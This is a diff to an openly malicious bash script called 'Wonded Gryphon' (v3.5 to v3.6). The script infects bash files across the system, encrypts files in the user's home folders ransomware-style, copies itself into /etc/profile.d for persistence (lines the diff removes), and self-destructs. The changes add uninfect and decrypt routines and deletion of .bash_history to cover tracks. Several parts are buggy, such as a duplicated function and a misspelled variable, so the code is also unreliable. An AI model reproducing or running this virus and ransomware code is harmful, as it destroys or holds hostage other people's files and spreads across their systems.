@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v3.5  ______----------- # ---------------
+#      / Wonded Gryphon v3.6  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -40,9 +40,11 @@ CAT=$(cat "$me")
 
 FLAG="#arrow"
 
-VERSION="v3.5"
+VERSION="v3.6"
 
 FLAG="$1"
+
+PAYLOAD="" # Choose payload when infecting
 
 MAXINFECTCOUNT=50 # Maximum infected files
 
@@ -169,6 +171,8 @@ function help() {
    echo " Infect all bash files on the system: --infect"
    echo " Encrypt files in Desktop, Videos ...: --encrypt"
    echo " Self destruct when done: (--infect, --encrypt) --self-destruct "
+   echo " Unencrypt files: --unencrypt "
+   echo " Uninfect system: --uninfect "
 
 # Virus mode
 
@@ -243,7 +247,7 @@ function infect() {
 
    INFECTCOUNT=$(($INFECTCOUNT + 1))
 
-   if [ "$INFECTCOUNT" == 50 ]
+   if [ "$INFECTCOUNT" == "$MAXINFECTCOUNT" ]
 
    then
       if [ "$@" =~ .*"--self-destruct" ]
@@ -283,17 +287,13 @@ function BANNER() {
 function virus_start() {
    
    BANNER # Very important :)
-
-   echo "$CAT" > /etc/profile.d/systeml.sh
-
-   chmod 755 /etc/profile.d/systeml.sh
-
+   
    cd /etc/profile.d/
-
+   
    check
-
+   
    if [ "$@" =~ .*"--self-destruct" ]
-
+   
    then
       cleanup
    
@@ -446,20 +446,218 @@ function ransom_start() {
    
 }
 
+# Uninfect
+
+function remcheck() {
+   
+   local IFBASH=$(grep -Fx "$SHEBANG" *)
+   
+   if [ "$IFBASH" =~ .*"$SHEBANG" ]
+
+   then
+      
+      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
+      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
+      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
+      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed 's|:#arrow||')
+      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
+       
+      if [ "$LIST" == "" ]
+       
+      then
+         
+         remfoldercheck
+      
+      else
+         
+         uninfect
+      
+      fi
+      
+    else
+       
+       remfoldercheck
+       
+    fi
+   
+}
+
+function remfoldercheck() {
+   
+   local LDIR=$(ls -d *)
+   
+   if [ "$LDIR" == "" ]
+
+   then
+      cd /
+
+      remcheck
+
+   else
+          
+      echo "$LDIR" > LIST.txt
+      
+      CDDIR=$(shuf -n1 LIST.txt)
+      
+      cd "$CDDIR"
+      
+      remcheck
+   fi
+}
+
+
+function uninfect() {
+   
+   sed -i '/"$PAYLOAD"/d' "$LIST"
+   sed -i '/"$FLAG"/d' "$LIST"
+
+   RINFECTCOUNT=$(($RINFECTCOUNT + 1))
+
+   if [ "$RINFECTCOUNT" == $MAXINFECTCOUND ]
+
+   then
+      echo "Done.."
+   
+   else
+      remcheck
+   
+   fi
+   
+}
+
+function uninfect() {
+   
+   BANNER # Very important :)
+
+   cd /etc/profile.d/
+
+   remcheck
+   
+   if [ "$@" =~ .*"--self-destruct" ]
+   
+   then
+      cleanup
+   
+   else
+      exit
+   
+   fi
+}
+
+# Unencrypt
+
+function unencryptvideos() {
+   
+   cd "$HOME"
+   cd Videos
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+}
+
+function unencryptdesktop() {
+   
+   cd "$HOME"
+   cd Desktop
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+}
+
+function unencryptpictures() {
+   
+   cd "$HOME"
+   cd Pictures
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+}
+
+function unencryptdocuments() {
+   
+   cd "$HOME"
+   cd Documents
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+}
+
+function unencryptdownloads() {
+   
+   cd "$HOME"
+   cd Downloads
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+
+}
+
+function unencryptmusic() {
+   
+   cd "$HOME"
+   cd Music
+   local LS=$(ls -a)
+   local LIST=$(echo "$LS" | tr "\n" " ")
+   ccdecrypt "$LIST" -K "$KEY"
+
+}
+
+function unencrypt() {
+   
+   BANNER
+   ccryptcheck
+   sleep 5
+   unencryptdesktop
+   sleep 5
+   unencryptdocuments
+   sleep 5
+   unencryptdownloads
+   sleep 5
+   unencryptmusic
+   sleep 5
+   unencryptpictures
+   sleep 5
+   unencryptvideos
+   cd "$HOME" && rm .bash_history
+   sleep 5
+   
+   if [ "$@" =~ .*"--self-destruct" ]
+
+   then
+      cleanup
+   
+   else
+      exit
+   
+   fi
+   
+}
+
+
 if [ "$FLAG" == "--infect" ]
 
 then
    virus_start
 
-elif [ "$FLAG" == "--encrypt"]
+elif [ "$FLAG" == "--encrypt" ]
 
 then
    ransom_start
+   
+elif [ "$FLAG" == "--uninfect" ]
+
+then
+   uninfect
 
 elif [ "$FLAG" == "--help" ]
 
 then
    help
+   
+elif [ "$FLAG" == "--unencrypt" ]
+
+then
+   unencrypt
 
 elif [ $# -le 0 ]
 
